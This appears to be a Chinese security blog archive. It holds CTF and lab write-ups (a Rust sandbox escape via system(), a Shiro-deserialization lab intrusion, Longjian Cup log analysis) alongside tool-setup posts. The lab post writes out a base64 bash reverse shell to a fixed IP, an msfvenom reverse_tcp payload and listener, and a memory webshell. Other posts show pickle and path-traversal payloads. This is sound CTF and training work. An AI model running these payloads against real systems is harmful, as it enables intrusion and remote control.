</span><br><span class="line">        .<span class="title function_ invoke__">sample_iter</span>(&amp;rand::distributions::Alphanumeric)  </span><br><span class="line">        .<span class="title function_ invoke__">take</span>(<span class="number">5</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">map</span>(<span class="type">char</span>::from)  </span><br><span class="line">        .collect::&lt;<span class="type">String</span>&gt;();  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(<span class="keyword">mut</span> file) = File::<span class="title function_ invoke__">create</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>, &amp;file_name)) &#123;  </span><br><span class="line">        file.<span class="title function_ invoke__">write_all</span>(code.<span class="title function_ invoke__">as_bytes</span>());  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(build_output) = Command::<span class="title function_ invoke__">new</span>(<span class="string">&quot;rustc&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-C&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;debuginfo=0&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-C&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;opt-level=3&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="string">&quot;-o&quot;</span>)  </span><br><span class="line">        .<span class="title function_ invoke__">arg</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">output</span>() &#123;  </span><br><span class="line">        <span class="keyword">if</span> !build_output.status.<span class="title function_ invoke__">success</span>()&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(build_output.stderr.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;.rs&quot;</span>,&amp;file_name));  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">let</span> <span class="variable">Ok</span>(output) = Command::<span class="title function_ invoke__">new</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name))  </span><br><span class="line">        .<span class="title function_ invoke__">output</span>() &#123;  </span><br><span class="line">        <span class="keyword">if</span> !output.status.<span class="title function_ invoke__">success</span>()&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(output.stderr.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;  </span><br><span class="line">            fs::<span class="title function_ invoke__">remove_file</span>(<span class="built_in">format!</span>(<span class="string">&quot;playground/&#123;&#125;&quot;</span>,&amp;file_name));  </span><br><span class="line">            <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">from_utf8_lossy</span>(output.stdout.<span class="title function_ invoke__">as_slice</span>()).<span class="title function_ invoke__">to_string</span>();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="type">String</span>::<span class="title function_ invoke__">default</span>();  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#[launch]</span>  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">rocket</span>() <span class="punctuation">-&gt;</span> _ &#123;  </span><br><span class="line">    <span class="keyword">let</span> <span class="variable">figment</span> = rocket::Config::<span class="title function_ invoke__">figment</span>()  </span><br><span class="line">        .<span class="title function_ invoke__">merge</span>((<span class="string">&quot;address&quot;</span>, <span class="string">&quot;0.0.0.0&quot;</span>));  </span><br><span class="line">    rocket::<span class="title function_ invoke__">custom</span>(figment).<span class="title function_ invoke__">mount</span>(<span class="string">&quot;/&quot;</span>, routes![])  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意<code>/rust_code</code>路由下，过滤了<code>std</code>表示禁止使用Rust的标准库。生成一个随机的长度为 5 的文件名，使用 <code>File::create</code> 创建一个文件，路径为 <code>playground/&#123;&#125;.rs</code>，然后运行rust代码并输出</p>
<p>我们的目标是通过system函数执行命令，但是system属于外部函数，需要我们声明一下</p>
<p>payload如下</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">//声明外部函数 C语言库函数</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">system</span>(cmd: *<span class="keyword">const</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">	<span class="comment">// Rust 中的 unsafe 块，用于执行不受 Rust 安全机制保护的操作</span></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag&quot;</span>.<span class="title function_ invoke__">as_ptr</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>或者是</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">	<span class="keyword">fn</span> <span class="title function_">system</span>(s: *<span class="keyword">const</span> <span class="type">u8</span>) <span class="punctuation">-&gt;</span> <span class="type">i32</span>;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;  </span><br><span class="line">	<span class="keyword">unsafe</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">b&quot;cat /flag&quot;</span> <span class="keyword">as</span> *<span class="keyword">const</span> <span class="type">u8</span>)</span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
  <entry>
    <title>记录kali如何挂梯子</title>
    <url>/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90.html</url>
    <content><![CDATA[<p>记录下kali如何挂梯子</p>
<span id="more"></span>



<p><strong>前言</strong></p>
<blockquote>
<p>网上关于Linux挂梯子的教程有挺多的，不过一开始按照参考文章都不行（搁置了好久）。现在有时间来弄结果成功了，特此记录下</p>
</blockquote>
<p><strong>步骤</strong></p>
<p>我们先创建clash目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir clash</span><br></pre></td></tr></table></figure>

<p>然后我们下载压缩包文件，选择对应操作系统版本</p>
<p>链接：<a href="https://archive.org/download/clash_for_windows_pkg">https://archive.org/download/clash_for_windows_pkg</a></p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425211553427.png"></p>
<p>解压后进入目录<code>Clash for Windows-0.20.39-x64-linux</code>，试试执行下程序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./cfw</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212131108.png"></p>
<p>成功打开后，我们可以汉化一下</p>
<p>访问<code>https://github.com/Z-Siqi/Clash-for-Windows_Chinese</code>，点击release后下载app.asar文件</p>
<p>然后替换<code>/clash/Clash for Windows-0.20.39-x64-linux/resources/</code>目录下的同名文件，重新启动即可</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212641961.png"></p>
<p>然后就是导入配置文件，我这里是直接在物理机下载下来配置文件然后导入</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212813415.png"></p>
<p>最后就是设置浏览器代理</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212844360.png"></p>
<p>设置好后，就能成功使用魔法访问外网</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%A6%82%E4%BD%95%E6%8C%82%E6%A2%AF%E5%AD%90/image-20240425212931593.png"></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>博客常用设置</title>
    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
<span id="more"></span>



<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>



<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>



<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>

<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
<h2 id="设置背景图片"><a href="#设置背景图片" class="headerlink" title="设置背景图片"></a>设置背景图片</h2><p>参考文章：<a href="https://blog.csdn.net/wang631106979/article/details/51375184">https://blog.csdn.net/wang631106979/article/details/51375184</a></p>
<p>图片资源：<a href="https://wanf3ng.github.io/2021/02/06/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E5%8D%9A%E5%AE%A2%E9%85%8D%E5%9B%BE%E7%9A%84%E7%BD%91%E7%AB%99/">https://wanf3ng.github.io/2021/02/06/%E5%88%86%E4%BA%AB%E5%87%A0%E4%B8%AA%E5%8D%9A%E5%AE%A2%E9%85%8D%E5%9B%BE%E7%9A%84%E7%BD%91%E7%AB%99/</a></p>
<h2 id="添加友链"><a href="#添加友链" class="headerlink" title="添加友链"></a>添加友链</h2><p>基于<strong>hexo+next</strong></p>
<p>参考文章：<a href="https://blog.csdn.net/qq_21237971/article/details/108395258">https://blog.csdn.net/qq_21237971/article/details/108395258</a></p>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
  </entry>
  <entry>
    <title>记录kali安装蚁剑</title>
    <url>/article/%E8%AE%B0%E5%BD%95kali%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91.html</url>
    <content><![CDATA[<p>解决kali安装蚁剑常见问题</p>
<span id="more"></span>

<h1 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h1><p>我们先在官网下载源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/AntSwordProject/antSword/releases/tag/2.1.15</span><br></pre></td></tr></table></figure>

<p>然后下载对应的加载器，我们查看本地kali的版本，我这里是x64</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91/image-20240710201028558.png"></p>
<p>去官网下载对应版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/AntSwordProject/AntSword-Loader</span><br></pre></td></tr></table></figure>

<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91/image-20240710201137708.png"></p>
<p>下载好后将俩zip文件解压到同一文件夹下</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91/image-20240710201214247.png"></p>
<p>切换为root用户进入加载器目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd AntSword-Loader-v4.0.3-linux-x64</span><br></pre></td></tr></table></figure>

<p>然后赋予执行权限，执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 AntSword</span><br><span class="line">./AntSword</span><br></pre></td></tr></table></figure>

<p>打开后初始化选择文件为我们刚刚下载好的源码，然后重新启动即可</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91/image-20240710201601313.png"></p>
<hr>
<h1 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h1><h2 id="问题一"><a href="#问题一" class="headerlink" title="问题一"></a>问题一</h2><p>如果在执行<code>./AntSword</code>的时候出现下面报错，是因为缺少了个配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error creating proxy: Unknown or unsupported transport “disabled” for address “disabled:” (g-io-error-quark, 13)</span><br><span class="line">Error creating proxy: Unknown or unsupported transport “disabled” for address “disabled:” (g-io-error-quark, 13)</span><br><span class="line">Error creating proxy: Unknown or unsupported transport “disabled” for address “disabled:” (g-io-error-quark, 13)</span><br><span class="line">Error creating proxy: Unknown or unsupported transport “disabled” for address “disabled:” (g-io-error-quark, 13)</span><br><span class="line">Error creating proxy: Unknown or unsupported transport “disabled” for address “disabled:” (g-io-error-quark, 13)</span><br><span class="line"></span><br><span class="line">(AntSword:127578): dconf-WARNING **: 09:22:26.257: failed to commit changes to dconf: Unknown or unsupported transport “disabled” for address “disabled:”</span><br></pre></td></tr></table></figure>

<p>我们安装 dconf-cli 工具就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install dconf-cli</span><br></pre></td></tr></table></figure>

<h2 id="问题二"><a href="#问题二" class="headerlink" title="问题二"></a>问题二</h2><p>如果在执行<code>./AntSword</code>的时候出现下面报错，是因为Mime 库大小写问题导致找不到</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95kali%E5%AE%89%E8%A3%85%E8%9A%81%E5%89%91/image-20240710201935979.png"></p>
<p>我们进入源码的目录下，将Mime 库的文件改成大写即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd antSword-2.1.15</span><br><span class="line">mv node_modules/mime/mime.js node_modules/mime/Mime.js</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>工具</category>
      </categories>
  </entry>
  <entry>
    <title>记录vscode调试nodejs</title>
    <url>/article/%E8%AE%B0%E5%BD%95vscode%E8%B0%83%E8%AF%95nodejs.html</url>
    <content><![CDATA[<p>调试nodejs代码还是比较基础的技能，开篇博客记录一下</p>
<span id="more"></span>

<h1 id="记录vscode调试nodejs"><a href="#记录vscode调试nodejs" class="headerlink" title="记录vscode调试nodejs"></a>记录vscode调试nodejs</h1><p>我们在demo文件夹下创建index.js，内容如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> url = <span class="built_in">require</span>(<span class="string">&#x27;url&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> query = url.<span class="title function_">parse</span>(req.<span class="property">url</span>, <span class="literal">true</span>).<span class="property">query</span>;</span><br><span class="line">    <span class="keyword">const</span> a = query.<span class="property">a</span>;</span><br><span class="line">    <span class="keyword">const</span> b = query.<span class="property">b</span>;</span><br><span class="line">    <span class="keyword">const</span> sum = <span class="built_in">parseInt</span>(a, <span class="number">10</span>) + <span class="built_in">parseInt</span>(b, <span class="number">10</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`<span class="subst">$&#123;a&#125;</span> + <span class="subst">$&#123;b&#125;</span> = <span class="subst">$&#123;sum&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running at http://localhost:3000/&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>我们在vscode点击创建<code>launch.json</code>文件，选择Node.js</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95vscode%E8%B0%83%E8%AF%95nodejs/image-20240729143827444.png"></p>
<p>这里配置文件最重要的就是<code>program</code>，指向的是我们的demo文件</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95vscode%E8%B0%83%E8%AF%95nodejs/image-20240729143912744.png"></p>
<p>我们在index.js第6行下断点，然后点击运行和调试</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95vscode%E8%B0%83%E8%AF%95nodejs/image-20240729144024024.png"></p>
<p>最后访问<code>http://localhost:3000/?a=1&amp;b=2</code>，传参a和b进行加法运算</p>
<p>调试成功，一步步往下调试即可</p>
<p><img src="/article/%E8%AE%B0%E5%BD%95vscode%E8%B0%83%E8%AF%95nodejs/image-20240729144340910.png"></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>vscode</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>记录某靶场渗透测试</title>
    <url>/article/%E8%AE%B0%E5%BD%95%E6%9F%90%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html</url>
    <content><![CDATA[<p>CTF-Archives项目里非常不错的一个靶场</p>
<span id="more"></span>

<h1 id="记录某靶场渗透测试"><a href="#记录某靶场渗透测试" class="headerlink" title="记录某靶场渗透测试"></a>记录某靶场渗透测试</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><blockquote>
<p>这里我是直接拿巨魔搭建的环境去打了，需要复现的请自行搭建</p>
</blockquote>
<p>项目地址：<a href="https://github.com/CTF-Archives/Puff-Pastry">https://github.com/CTF-Archives/Puff-Pastry</a></p>
<p>整体配置图如下</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726110222368.png" alt="image-20240726110222368"></p>
<hr>
<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>fscan扫描一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.\fscan.exe -h 139.9.4.56</span><br></pre></td></tr></table></figure>

<p>扫描结果如下</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726113327569.png" alt="image-20240726113327569"></p>
<p>扫出来8080端口存在shiro反序列化，密钥是默认密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kPH+bIxk5D2deZiIxcaaaA==</span><br></pre></td></tr></table></figure>

<h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><p>我们访问一下8080端口，发现是登陆界面</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726113010804.png" alt="image-20240726113010804"></p>
<p>打开shiro利用工具，修改为POST请求，添加上密钥看看</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728164920663.png" alt="image-20240728164920663"></p>
<p>说明存在漏洞，并且爆出利用链</p>
<p>当前为root权限</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726123511126.png" alt="image-20240726123511126"></p>
<p>直接写入内存马，然后蚁剑选择jsp连接类型连接</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728171605559.png" alt="image-20240728171605559"></p>
<p>当然也可以写个sh文件来弹shell（这里SummerSec写的工具echo命令有问题，我换成v2.2版本写的）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># bash -i &gt;&amp; /dev/tcp/156.238.233.68/1028 0&gt;&amp;1</span><br><span class="line">echo &quot;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTYuMjM4LjIzMy42OC8xMDI4IDA+JjE=|base64 -d|bash&quot; &gt; /tmp/shell.sh</span><br><span class="line">chmod +x /tmp/shell.sh</span><br></pre></td></tr></table></figure>

<p>蚁剑连接上后，在根目录下拿到第一个flag</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726161923968.png" alt="image-20240726161923968"></p>
<h3 id="联动蚁剑上线metasploit"><a href="#联动蚁剑上线metasploit" class="headerlink" title="联动蚁剑上线metasploit"></a>联动蚁剑上线metasploit</h3><p>先用msfvenom生成linux的马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=156.238.233.68 LPORT=1028 -f elf -o payload.elf</span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728172739921.png" alt="image-20240728172739921"></p>
<p>将生成的马上传到<code>/tmp</code>目录下，赋予elf文件可执行权限</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728172814279.png" alt="image-20240728172814279"></p>
<p>然后开启msf监听器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">set lhost 156.238.233.68</span><br><span class="line">set lport 1028</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>再执行elf文件成功上线metasploit</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728173404631.png" alt="image-20240728173404631"></p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><blockquote>
<p>因为蚁剑的shell权限比较高，所以直接在蚁剑进行信息收集</p>
</blockquote>
<h4 id="本机基础信息收集"><a href="#本机基础信息收集" class="headerlink" title="本机基础信息收集"></a>本机基础信息收集</h4><h5 id="查看网络配置信息"><a href="#查看网络配置信息" class="headerlink" title="查看网络配置信息"></a>查看网络配置信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>

<p>本机所处网段为<code>192.168.100.0/24</code></p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726162432184.png" alt="image-20240726162432184"></p>
<h5 id="查看操作系统信息"><a href="#查看操作系统信息" class="headerlink" title="查看操作系统信息"></a>查看操作系统信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>

<p>尝试systeminfo发现不是windows系统，执行uname得到本机为Ubuntu系统</p>
<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726162610669.png" alt="image-20240726162610669"></p>
<h5 id="查看用户信息"><a href="#查看用户信息" class="headerlink" title="查看用户信息"></a>查看用户信息</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240726162922688.png" alt="image-20240726162922688"></p>
<h4 id="探测内网存活主机"><a href="#探测内网存活主机" class="headerlink" title="探测内网存活主机"></a>探测内网存活主机</h4><p>执行<code>background</code>回到msf6会话，基于ARP协议来发现内网存活主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br><span class="line">set RHOSTS 192.168.100.0/24</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>这里换其他协议都扫不出来，那只能上传fscan来扫</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./fscan -h 192.168.100.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20240728181023781.png" alt="image-20240728181023781"></p>
<p>发现还存在ip为<code>192.168.100.2</code>的主机</p>
<hr>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>Ubuntu安装metasploit</p>
<ul>
<li><a href="https://blog.csdn.net/qq_46717339/article/details/122653084">https://blog.csdn.net/qq_46717339/article/details/122653084</a></li>
</ul>
<p>metasploit探测内网存活主机</p>
<ul>
<li><a href="https://www.mi1k7ea.com/2021/02/24/%E5%9F%BA%E4%BA%8EMSF%E7%9A%84%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B/">https://www.mi1k7ea.com/2021/02/24/%E5%9F%BA%E4%BA%8EMSF%E7%9A%84%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B/</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
  </entry>
  <entry>
    <title>陇剑杯 2021</title>
    <url>/article/%E9%99%87%E5%89%91%E6%9D%AF2021.html</url>
    <content><![CDATA[<p>记录陇剑杯的流量分析题</p>
<span id="more"></span>



<h1 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h1><h2 id="Task1"><a href="#Task1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>网络存在源码泄漏，源码文件名是什么</strong></p>
<p>web手都知道的<code>www.zip</code></p>
<h2 id="Task2"><a href="#Task2" class="headerlink" title="Task2"></a>Task2</h2><p><strong>分析攻击流量，黑客往&#x2F;tmp目录写入一个文件，文件名为什么</strong></p>
<p>直接搜索<code>/tmp</code>找到写的文件，url解码一下文件名为<code>sess_car</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?filename=../../../../../../../../../../../../../../../../../tmp/sess_car&amp;content=func|N;files|a:2:&#123;s:8:&quot;filename&quot;;s:16:&quot;./files/filename&quot;;s:20:&quot;call_user_func_array&quot;;s:28:&quot;./files/call_user_func_array&quot;;&#125;paths|a:1:&#123;s:5:&quot;/flag&quot;;s:13:&quot;SplFileObject&quot;;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Task3"><a href="#Task3" class="headerlink" title="Task3"></a>Task3</h2><p><strong>分析攻击流量，黑客使用的是什么类读取了秘密文件。</strong></p>
<p>前一问已经知道利用的是<code>SplFileObject</code>原生类读取文件</p>
<h1 id="简单日志分析"><a href="#简单日志分析" class="headerlink" title="简单日志分析"></a>简单日志分析</h1><h2 id="Task1-1"><a href="#Task1-1" class="headerlink" title="Task1"></a>Task1</h2><p><strong>黑客攻击的参数是什么</strong></p>
<p>打开日志文件看，很明显只有user参数，解码一下发现是pickle反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I0</span><br><span class="line">p0</span><br><span class="line">0S&#x27;whoami&#x27;</span><br><span class="line">p1</span><br><span class="line">0(g0</span><br><span class="line">lp2</span><br><span class="line">0(I0</span><br><span class="line">tp3</span><br><span class="line">0(g3</span><br><span class="line">I0</span><br><span class="line">dp4</span><br><span class="line">0cos</span><br><span class="line">system</span><br><span class="line">p5</span><br><span class="line">0g5</span><br><span class="line">(g1</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure>



<h2 id="Task2-1"><a href="#Task2-1" class="headerlink" title="Task2"></a>Task2</h2><p><strong>黑客查看的秘密文件的绝对路径是什么</strong></p>
<p>往后看user参数值解码一下就行</p>
